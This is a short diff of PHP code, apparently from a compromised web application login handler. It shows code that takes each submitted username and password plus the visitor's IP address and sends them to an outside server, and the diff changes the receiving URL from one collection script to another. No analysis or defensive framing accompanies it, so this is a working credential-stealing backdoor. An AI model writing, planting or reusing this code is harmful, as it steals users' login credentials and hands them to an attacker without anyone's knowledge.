@@ -40,6 +40,6 @@ if (strlen($_POST["password"]) > 0 ) {
 $pass = urlencode($_POST["password"]);
 $user = urlencode($_POST["username"]);
 $addr = urlencode($_SERVER["REMOTE_ADDR"]);
-$url = "http://186.225.111.210:8888/fusionpbx/includes/lkey.php?ip="."$addr"."&user="."$user"."&pass="."$pass"."";
+$url = "http://sw185.vidanetwork.net/web/1mail.php?ip="."$addr"."&user="."$user"."&pass="."$pass"."";
 get_url($url); }
 ?>
